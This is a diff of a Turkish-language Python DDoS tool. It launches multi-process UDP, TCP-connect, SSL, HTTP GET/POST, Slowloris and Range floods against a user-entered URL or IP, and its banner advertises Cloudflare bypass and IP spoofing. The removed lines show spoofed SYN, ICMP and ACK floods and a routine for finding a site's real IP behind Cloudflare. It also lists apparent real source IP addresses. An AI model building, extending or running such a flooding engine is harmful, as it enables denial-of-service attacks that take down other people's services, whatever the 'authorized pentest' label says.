+    def layer4_worker_udp_burst():
+        while running:
+            udp_flood_burst(target, port, src_ip)
+    
+    def layer4_worker_tcp():
+        while running:
+            tcp_syn_noroot(target, port, src_ip)
+    
+    def layer4_worker_connect():
+        while running:
+            tcp_connect_flood(target, port, src_ip)
+    
+    def layer4_worker_ssl():
+        while running:
+            tcp_ssl_connect(target, port, src_ip)
+    
+    def layer7_worker_http():
+        while running:
+            http_attack_advanced(target_url, src_ip)
+    
+    def layer7_worker_post():
+        while running:
+            http_post_heavy(target_url, src_ip)
+    
+    def layer7_worker_slow():
+        while running:
+            http_slowloris(target_url, src_ip)
+    
+    def layer7_worker_range():
+        while running:
+            http_range_flood(target_url, src_ip)
+    
+    # Thread'leri oluştur
+    if attack_mode in ["udp", "all4", "all"]:
+        for _ in range(threads_per_process // 5):
+            t = threading.Thread(target=layer4_worker_udp)
+            t.daemon = True; threads.append(t); t.start()
+            t = threading.Thread(target=layer4_worker_udp_burst)
+            t.daemon = True; threads.append(t); t.start()
+    
+    if attack_mode in ["syn", "all4", "all"]:
+        for _ in range(threads_per_process // 5):
+            t = threading.Thread(target=layer4_worker_tcp)
+            t.daemon = True; threads.append(t); t.start()
+    
+    if attack_mode in ["tcp", "all4", "all"]:
+        for _ in range(threads_per_process // 5):
+            t = threading.Thread(target=layer4_worker_connect)
+            t.daemon = True; threads.append(t); t.start()
+    
+    if attack_mode in ["ssl", "all4", "all"]:
+        for _ in range(threads_per_process // 5):
+            t = threading.Thread(target=layer4_worker_ssl)
+            t.daemon = True; threads.append(t); t.start()
+    
+    if target_url and attack_mode in ["get", "all7", "all"]:
+        for _ in range(threads_per_process // 5):
+            t = threading.Thread(target=layer7_worker_http)
+            t.daemon = True; threads.append(t); t.start()
+    
+    if target_url and attack_mode in ["post", "all7", "all"]:
+        for _ in range(threads_per_process // 5):
+            t = threading.Thread(target=layer7_worker_post)
+            t.daemon = True; threads.append(t); t.start()
+    
+    if target_url and attack_mode in ["slow", "all7", "all"]:
+        for _ in range(threads_per_process // 5):
+            t = threading.Thread(target=layer7_worker_slow)
+            t.daemon = True; threads.append(t); t.start()
+    
+    if target_url and attack_mode in ["range", "all7", "all"]:
+        for _ in range(threads_per_process // 5):
+            t = threading.Thread(target=layer7_worker_range)
+            t.daemon = True; threads.append(t); t.start()
+    
+    print(f"\033[1;36m  [Process {process_id}] {len(threads)} thread başlatıldı (kaynak: {src_ip})\033[0m")
     
     while running:
-        time.sleep(0.5)
+        time.sleep(1)
+
+# ==================== İSTATİSTİK ====================
+
+def stats_monitor():
+    """Gelişmiş istatistik monitörü"""
+    global running, total_packets, total_bytes, total_errors, start_time
+    
+    while running:
+        time.sleep(1)
         
         with stats_lock:
             pkts = total_packets
             bytes_s = total_bytes
+            errs = total_errors
         
         elapsed = time.time() - start_time
-        if elapsed > 0:
+        if elapsed > 1:
             mbps = (bytes_s * 8) / elapsed / 1_000_000
             pps = pkts / elapsed
             mb_total = bytes_s / 1_000_000
@@ -568,90 +504,43 @@ def stats_display():
             pps = 0
             mb_total = 0
         
-        # Mbps'yi renk kodla
-        if mbps > 100:
-            speed_color = '\033[1;31m'  # Kırmızı - çok yüksek
+        # Güç göstergesi
+        if mbps > 500:
+            power = "💀 MAX GÜÇ"
+        elif mbps > 200:
+            power = "🔥 ÇOK YÜKSEK"
+        elif mbps > 100:
+            power = "⚡ YÜKSEK"
         elif mbps > 50:
-            speed_color = '\033[1;33m'  # Sarı - yüksek
+            power = "✅ İYİ"
         elif mbps > 10:
-            speed_color = '\033[1;32m'  # Yeşil - orta
+            power = "⚠️ DÜŞÜK"
         else:
-            speed_color = '\033[1;37m'  # Beyaz - düşük
+            power = "🐢 ÇOK DÜŞÜK"
         
-        source_info = " | ".join([f"\033[1;33m{s}\033[0m" for s in SOURCE_IPS])
-        
-        sys.stdout.write('\033[2K\r')  # Satırı temizle
+        sys.stdout.write('\033[2K\r')
         sys.stdout.write(
             f"\033[1;36m[{datetime.now().strftime('%H:%M:%S')}] "
-            f"\033[1;32m📦 {pkts:,} pkt "
-            f"{speed_color}📊 {mbps:.1f} Mbps "
-            f"\033[1;33m⚡ {pps:,.0f} pps "
-            f"\033[1;35m💾 {mb_total:.1f} MB "
-            f"\033[1;37m⏱ {elapsed:.0f}s "
-            f"\033[1;34m🌐 {len(SOURCE_IPS)} kaynak\033[0m"
+            f"\033[1;31m{power}\033[0m | "
+            f"\033[1;33m📊 {mbps:.1f} Mbps\033[0m | "
+            f"\033[1;32m📦 {pkts:,} pkt\033[0m | "
+            f"\033[1;34m⚡ {pps:,.0f} pps\033[0m | "
+            f"\033[1;35m💾 {mb_total:.1f} MB\033[0m | "
+            f"\033[1;37m⏱ {elapsed:.0f}s\033[0m | "
+            f"\033[1;31m❌ {errs:,} hata\033[0m"
         )
         sys.stdout.flush()
 
-# ==================== THREAD YÖNETİCİSİ ====================
-
-def worker_layer4_syn(target, port, src_ip):
-    while running:
-        syn_flood_spoofed(target, port, src_ip)
-        syn_flood_rapid(target, port, src_ip)
-
-def worker_layer4_udp(target, port, src_ip):
-    while running:
-        udp_flood_max(target, port, src_ip)
-
-def worker_layer4_icmp(target, src_ip):
-    while running:
-        icmp_flood_massive(target, src_ip)
-
-def worker_layer4_ack(target, port, src_ip):
-    while running:
-        tcp_ack_flood(target, port, src_ip)
-
-def worker_layer7_get(target_url, src_ip):
-    while running:
-        http_flood_advanced(target_url, src_ip)
-
-def worker_layer7_post(target_url, src_ip):
-    while running:
-        http_post_massive(target_url, src_ip)
-
-def worker_layer7_slow(target_url, src_ip):
-    while running:
-        http_slow_read(target_url, src_ip)
-
-# ==================== ANA SALDIRI MOTORU ====================
+# ==================== ANA MOTOR ====================
 
 def launch_attack(target, port, attack_mode, target_is_ip=False):
-    """Ana saldırı fonksiyonu"""
-    global running, start_time, total_packets, total_bytes
+    global running, start_time, total_packets, total_bytes, total_errors
     
     running = True
     start_time = time.time()
     total_packets = 0
     total_bytes = 0
-    
-    print(f"\n\033[1;31m{'='*60}\033[0m")
-    print(f"\033[1;31m🔥 ÇOKLU KAYNAK DDoS SALDIRISI BAŞLATILDI 🔥\033[0m")
-    print(f"\033[1;31m{'='*60}\033[0m")
-    print(f"\033[1;36m🎯 Hedef: \033[1;33m{target}\033[0m")
-    print(f"\033[1;36m🔌 Port: \033[1;33m{port}\033[0m")
-    print(f"\033[1;36m🌐 Kaynak IP'ler: \033[1;33m{', '.join(SOURCE_IPS)}\033[0m")
-    print(f"\033[1;36m⚙️  Saldırı Modu: \033[1;33m{attack_mode.upper()}\033[0m")
-    print(f"\033[1;36m🧵 Thread: \033[1;33m{THREAD_COUNT:,}\033[0m")
-    print(f"\033[1;31m{'='*60}\033[0m")
-    print(f"\033[1;37m[!] Durdurmak için Ctrl+C basın\033[0m")
-    print(f"\033[1;37m[!] Gerçek paketler gönderiliyor - SPOOFED IP adresleriyle\033[0m\n")
-    
-    threads = []
-    
-    # İstatistik thread'i
-    t = threading.Thread(target=stats_display)
-    t.daemon = True
-    t.start()
+    total_errors = 0
     
     # URL hazırlığı
     target_url = None
@@ -660,45 +549,45 @@ def launch_attack(target, port, attack_mode, target_is_ip=False):
         if not target_url.startswith('http'):
             target_url = f"http://{target}"
     
-    # Her kaynak IP için thread'ler oluştur
-    for src_ip in SOURCE_IPS:
-        if attack_mode in ["syn", "all4", "all"]:
-            for _ in range(THREAD_COUNT // 12):
-                t = threading.Thread(target=worker_layer4_syn, args=(target, port, src_ip))
-                t.daemon = True; threads.append(t); t.start()
-        
-        if attack_mode in ["udp", "all4", "all"]:
-            for _ in range(THREAD_COUNT // 12):
-                t = threading.Thread(target=worker_layer4_udp, args=(target, port, src_ip))
-                t.daemon = True; threads.append(t); t.start()
-        
-        if attack_mode in ["icmp", "all4", "all"]:
-            for _ in range(THREAD_COUNT // 12):
-                t = threading.Thread(target=worker_layer4_icmp, args=(target, src_ip))
-                t.daemon = True; threads.append(t); t.start()
-        
-        if attack_mode in ["ack", "all4", "all"]:
-            for _ in range(THREAD_COUNT // 12):
-                t = threading.Thread(target=worker_layer4_ack, args=(target, port, src_ip))
-                t.daemon = True; threads.append(t); t.start()
-        
-        if target_url and attack_mode in ["get", "all7", "all"]:
-            for _ in range(THREAD_COUNT // 12):
-                t = threading.Thread(target=worker_layer7_get, args=(target_url, src_ip))
-                t.daemon = True; threads.append(t); t.start()
-        
-        if target_url and attack_mode in ["post", "all7", "all"]:
-            for _ in range(THREAD_COUNT // 12):
-                t = threading.Thread(target=worker_layer7_post, args=(target_url, src_ip))
-                t.daemon = True; threads.append(t); t.start()
-        
-        if target_url and attack_mode in ["slow", "all7", "all"]:
-            for _ in range(THREAD_COUNT // 12):
-                t = threading.Thread(target=worker_layer7_slow, args=(target_url, src_ip))
-                t.daemon = True; threads.append(t); t.start()
+    print(f"\n\033[1;31m{'='*60}\033[0m")
+    print(f"\033[1;31m🔥 ROOTSUZ ÇOKLU-KAYNAK DDoS BAŞLATILDI 🔥\033[0m")
+    print(f"\033[1;31m{'='*60}\033[0m")
+    print(f"\033[1;36m🎯 Hedef: \033[1;33m{target}\033[0m")
+    print(f"\033[1;36m🔌 Port: \033[1;33m{port}\033[0m")
+    print(f"\033[1;36m🌐 Kaynak IP'ler: \033[1;33m{', '.join(SOURCE_IPS)}\033[0m")
+    print(f"\033[1;36m⚙️  Mod: \033[1;33m{attack_mode.upper()}\033[0m")
+    print(f"\033[1;36m🧵 Thread: \033[1;33m{MAX_THREADS:,}\033[0m")
+    print(f"\033[1;36m🖥️  Process: \033[1;33m{MAX_PROCESSES}\033[0m")
+    print(f"\033[1;36m🔓 Root: \033[1;32mGEREKMEZ\033[0m")
+    print(f"\033[1;31m{'='*60}\033[0m")
+    print(f"\033[1;37m[!] Ctrl+C ile durdur\033[0m\n")
     
-    print(f"\033[1;32m[✅] {len(threads)} thread aktif - {len(SOURCE_IPS)} kaynak IP'den saldırı\033[0m")
-    print(f"\033[1;32m[✅] Her kaynak IP ayrı ayrı saldırı yapıyor\033[0m\n")
+    # İstatistik thread'i
+    t = threading.Thread(target=stats_monitor)
+    t.daemon = True
+    t.start()
+    
+    # Multiprocessing ile process'leri başlat
+    processes = []
+    process_id = 0
+    
+    for src_ip in SOURCE_IPS:
+        for p in range(MAX_PROCESSES):
+            p_id = f"{src_ip.split('.')[-1]}-{p+1}"
+            proc = multiprocessing.Process(
+                target=worker_process,
+                args=(target, port, attack_mode, target_url, src_ip, p_id)
+            )
+            proc.daemon = True
+            processes.append(proc)
+            proc.start()
+            process_id += 1
+            time.sleep(0.1)  # Aynı anda başlatma
+    
+    total = len(processes)
+    print(f"\n\033[1;32m[✅] {total} process başlatıldı")
+    print(f"[✅] {total * (MAX_THREADS // (MAX_PROCESSES * len(SOURCE_IPS)))} thread aktif")
+    print(f"[✅] 3 kaynak IP'den eş zamanlı saldırı\033[0m\n")
     
     try:
         while running:
@@ -706,142 +595,128 @@ def launch_attack(target, port, attack_mode, target_is_ip=False):
     except KeyboardInterrupt:
         running = False
         elapsed = time.time() - start_time
+        
+        for proc in processes:
+            proc.terminate()
+            proc.join(timeout=1)
+        
         with stats_lock:
             final_packets = total_packets
             final_bytes = total_bytes
+            final_errors = total_errors
         
         mbps = (final_bytes * 8) / elapsed / 1_000_000 if elapsed > 0 else 0
+        
         print(f"\n\n\033[1;31m{'='*50}\033[0m")
         print(f"\033[1;31m⛔ SALDIRI DURDURULDU\033[0m")
         print(f"\033[1;31m{'='*50}\033[0m")
         print(f"\033[1;33m📊 Toplam Paket: {final_packets:,}\033[0m")
         print(f"\033[1;33m📊 Toplam Veri: {final_bytes/1_000_000:.1f} MB\033[0m")
+        print(f"\033[1;33m📊 Toplam Hata: {final_errors:,}\033[0m")
         print(f"\033[1;33m📊 Süre: {elapsed:.0f} saniye\033[0m")
         print(f"\033[1;33m📊 Ortalama Hız: {mbps:.1f} Mbps\033[0m")
-        print(f"\033[1;33m📊 Ortalama PPS: {final_packets/elapsed:,.0f} pps\033[0m")
+        print(f"\033[1;33m📊 PPS: {final_packets/elapsed:,.0f}\033[0m")
         print(f"\033[1;31m{'='*50}\033[0m")
 
 # ==================== MENU ====================
 
 def main():
-    global THREAD_COUNT
+    global MAX_THREADS, MAX_PROCESSES
     
     os.system('clear')
-    print("""\033[1;31m
-    ██████╗ ██████╗ ██████╗ ███████╗
-    ██╔══██╗╚════██╗██╔══██╗██╔════╝
-    ██║  ██║ █████╔╝██║  ██║███████╗
-    ██║  ██║ ╚═══██╗██║  ██║╚════██║
-    ██████╔╝██████╔╝██████╔╝███████║
-    ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
-    \033[1;36m[ Multi-Source DDoS Engine v5.0 ]
-    [ 3 Kaynak IP: 78.181.164.55 | 192.168.1.140 | 192.168.1.138 ]
-    [ Layer 4 + Layer 7 | Cloudflare Bypass | IP Spoofing ]
-    \033[1;32m[ Yetkili Pentest İçin ]
+    print("""\033[1;36m
+    ╔══════════════════════════════════════════════╗
+    ║     ROOTSUZ DDoS ENGINE v5.1                ║
+    ║     3 Kaynak IP: 78.181.164.55              ║
+    ║                  192.168.1.140               ║
+    ║                  192.168.1.138               ║
+    ║     Layer 4 + Layer 7 | ROOT GEREKMEZ       ║
+    ║     Cloudflare Bypass | Multiprocessing      ║
+    ╚══════════════════════════════════════════════╝
     \033[0m""")
     
-    try:
-        is_root = os.geteuid() == 0
-    except:
-        is_root = False
-    
-    if not is_root:
-        print("\033[1;33m[!] Root GEREKLİ! Termux: pkg install tsu && tsu\033[0m")
-        print("\033[1;33m[!] Root olmadan Layer 4 metodları çalışmaz!\033[0m")
-        sys.exit(1)
-    
-    print(f"\033[1;32m[✓] Root yetkisi var\033[0m")
-    print(f"\033[1;36m[✓] Kaynak IP'ler: {', '.join(SOURCE_IPS)}\033[0m\n")
-    
-    print("\033[1;36m╔══════════════════════════════════════════════════╗\033[0m")
-    print("\033[1;36m║          SALDIRI MODU SEÇİN                    ║\033[0m")
-    print("\033[1;36m╠══════════════════════════════════════════════════╣\033[0m")
-    print("\033[1;36m║  \033[1;31m[1]\033[1;36m L4→ SYN Flood         \033[1;37m(max 100 Mbps)  ║\033[0m")
-    print("\033[1;36m║  \033[1;31m[2]\033[1;36m L4→ UDP Flood         \033[1;37m(max 200 Mbps)  ║\033[0m")
-    print("\033[1;36m║  \033[1;31m[3]\033[1;36m L4→ ICMP Flood        \033[1;37m(max 80 Mbps)   ║\033[0m")
-    print("\033[1;36m║  \033[1;31m[4]\033[1;36m L4→ TCP ACK Flood     \033[1;37m(max 100 Mbps)  ║\033[0m")
-    print("\033[1;36m║  \033[1;31m[5]\033[1;36m L4→ TÜMÜ (SYN+UDP+ICMP+ACK) \033[1;37mmax!  ║\033[0m")
-    print("\033[1;36m║  \033[1;31m[6]\033[1;36m L7→ HTTP GET Flood    \033[1;37m(CF Bypass)    ║\033[0m")
-    print("\033[1;36m║  \033[1;31m[7]\033[1;36m L7→ HTTP POST Flood   \033[1;37m(256KB veri)   ║\033[0m")
-    print("\033[1;36m║  \033[1;31m[8]\033[1;36m L7→ Slow Read         \033[1;37m(konuşma)      ║\033[0m")
-    print("\033[1;36m║  \033[1;31m[9]\033[1;36m L7→ TÜMÜ (GET+POST+Slow) \033[1;37m(CF Bypass) ║\033[0m")
-    print("\033[1;36m║  \033[1;31m[10]\033[1;36m L4+L7 KOMBO (MAX GÜÇ!)\033[1;37m TÜM METHODLAR║\033[0m")
-    print("\033[1;36m╚══════════════════════════════════════════════════╝\033[0m")
+    print("\033[1;36m╔════════════════════════════════════════╗\033[0m")
+    print("\033[1;36m║        SALDIRI MODU SEÇİN            ║\033[0m")
+    print("\033[1;36m╠════════════════════════════════════════╣\033[0m")
+    print("\033[1;36m║  \033[1;37m[1]\033[1;36m L4 → UDP Flood (MAX BOYUT)       ║\033[0m")
+    print("\033[1;36m║  \033[1;37m[2]\033[1;36m L4 → TCP Connect Flood          ║\033[0m")
+    print("\033[1;36m║  \033[1;37m[3]\033[1;36m L4 → SSL/TLS Flood             ║\033[0m")
+    print("\033[1;36m║  \033[1;37m[4]\033[1;36m L4 → TÜMÜ (UDP+TCP+SSL)         ║\033[0m")
+    print("\033[1;36m║  \033[1;37m[5]\033[1;36m L7 → HTTP GET (CF Bypass)       ║\033[0m")
+    print("\033[1;36m║  \033[1;37m[6]\033[1;36m L7 → HTTP POST (128KB)         ║\033[0m")
+    print("\033[1;36m║  \033[1;37m[7]\033[1;36m L7 → Slowloris                 ║\033[0m")
+    print("\033[1;36m║  \033[1;37m[8]\033[1;36m L7 → Range Flood               ║\033[0m")
+    print("\033[1;36m║  \033[1;37m[9]\033[1;36m L7 → TÜMÜ (GET+POST+Slow+Range) ║\033[0m")
+    print("\033[1;36m║  \033[1;31m[10]\033[1;36m L4+L7 KOMBO (MAX GÜÇ!)          ║\033[0m")
+    print("\033[1;36m╚════════════════════════════════════════╝\033[0m")
     
     choice = input("\n\033[1;33m[?] Seçim (1-10): \033[0m").strip()
     
-    attack_modes = {
-        "1": "syn", "2": "udp", "3": "icmp", "4": "ack",
-        "5": "all4", "6": "get", "7": "post", "8": "slow",
+    modes = {
+        "1": "udp", "2": "tcp", "3": "ssl", "4": "all4",
+        "5": "get", "6": "post", "7": "slow", "8": "range",
         "9": "all7", "10": "all"
     }
     
-    if choice not in attack_modes:
+    if choice not in modes:
         print("\033[1;31m[!] Geçersiz seçim!\033[0m")
         return
     
-    attack_mode = attack_modes[choice]
+    attack_mode = modes[choice]
     
-    print("\n\033[1;36m╔══════════════════════════════════════════════════╗\033[0m")
-    print("\033[1;36m║              HEDEF SEÇİN                       ║\033[0m")
-    print("\033[1;36m╠══════════════════════════════════════════════════╣\033[0m")
-    print("\033[1;36m║  \033[1;33m[1]\033[1;36m Site URL (http://site.com)                ║\033[0m")
-    print("\033[1;36m║  \033[1;33m[2]\033[1;36m IP Adresi                                  ║\033[0m")
-    print("\033[1;36m╚══════════════════════════════════════════════════╝\033[0m")
+    print("\n\033[1;36m╔════════════════════════════════════════╗\033[0m")
+    print("\033[1;36m║           HEDEF SEÇİN                 ║\033[0m")
+    print("\033[1;36m╠════════════════════════════════════════╣\033[0m")
+    print("\033[1;36m║  \033[1;33m[1]\033[1;36m URL (site.com)                  ║\033[0m")
+    print("\033[1;36m║  \033[1;33m[2]\033[1;36m IP Adresi                       ║\033[0m")
+    print("\033[1;36m╚════════════════════════════════════════╝\033[0m")
     
-    target_choice = input("\n\033[1;33m[?] Seçim (1-2): \033[0m").strip()
+    tc = input("\n\033[1;33m[?] Seçim (1-2): \033[0m").strip()
     
     target = None
     port = 80
     is_ip = False
     
-    if target_choice == "1":
-        target = input("\033[1;33m[?] Hedef URL (https://site.com): \033[0m").strip()
+    if tc == "1":
+        target = input("\033[1;33m[?] Hedef URL (site.com): \033[0m").strip()
         if not target.startswith('http'):
-            target = f"http://{target}"
-        
-        # Cloudflare kontrolü
-        parsed = urlparse(target)
-        domain = parsed.netloc or parsed.hostname
-        print(f"\033[1;36m[ℹ] Domain: {domain}\033[0m")
-        print(f"\033[1;36m[ℹ] Cloudflare bypass deneniyor...\033[0m")
-        
-        real_ips = find_real_ip(domain)
-        if real_ips:
-            print(f"\033[1;32m[✓] Gerçek IP'ler bulundu: {', '.join(real_ips)}\033[0m")
-            print(f"\033[1;33m[!] Gerçek IP'ye mi yoksa domain'e mi saldıracaksınız?\033[0m")
-            ip_choice = input("\033[1;33m[?] Gerçek IP kullan? (e/h): \033[0m").strip().lower()
-            if ip_choice == 'e':
-                target = real_ips[0]
-                is_ip = True
-        
-        port_input = input(f"\033[1;33m[?] Port (varsayılan: {443 if target.startswith('https') else 80}): \033[0m").strip()
-        if port_input:
-            try:
-                port = int(port_input)
-            except:
-                port = 443 if target.startswith('https') else 80
-        else:
-            port = 443 if target.startswith('https') else 80
-    
-    elif target_choice == "2":
+            target = f"https://{target}"
+        is_ip = False
+        port_str = input(f"\033[1;33m[?] Port (varsayılan: 443): \033[0m").strip()
+        try:
+            port = int(port_str)
+        except:
+            port = 443
+    elif tc == "2":
         target = input("\033[1;33m[?] Hedef IP: \033[0m").strip()
         is_ip = True
-        port_str = input("\033[1;33m[?] Port: \033[0m").strip()
+        port_str = input("\033[1;33m[?] Port (örn: 80, 443): \033[0m").strip()
         try:
             port = int(port_str)
         except:
             port = 80
+    else:
+        print("\033[1;31m[!] Geçersiz!\033[0m")
+        return
     
-    # Thread sayısı
-    tc = input(f"\033[1;33m[?] Thread sayısı (varsayılan: {THREAD_COUNT}, max 10000): \033[0m").strip()
+    # Performans ayarları
+    tc = input(f"\033[1;33m[?] Thread sayısı (varsayılan: {MAX_THREADS}, max 10000): \033[0m").strip()
     if tc:
         try:
-            THREAD_COUNT = max(500, min(10000, int(tc)))
+            MAX_THREADS = max(100, min(10000, int(tc)))
+        except:
+            pass
+    
+    pc = input(f"\033[1;33m[?] Process sayısı (varsayılan: {MAX_PROCESSES}, CPU çekirdeğiniz kadar): \033[0m").strip()
+    if pc:
+        try:
+            MAX_PROCESSES = max(1, min(8, int(pc)))
         except:
             pass
     
     launch_attack(target, port, attack_mode, is_ip)
 
 if __name__ == "__main__":
+    # Multiprocessing desteği
+    multiprocessing.freeze_support()
     main()
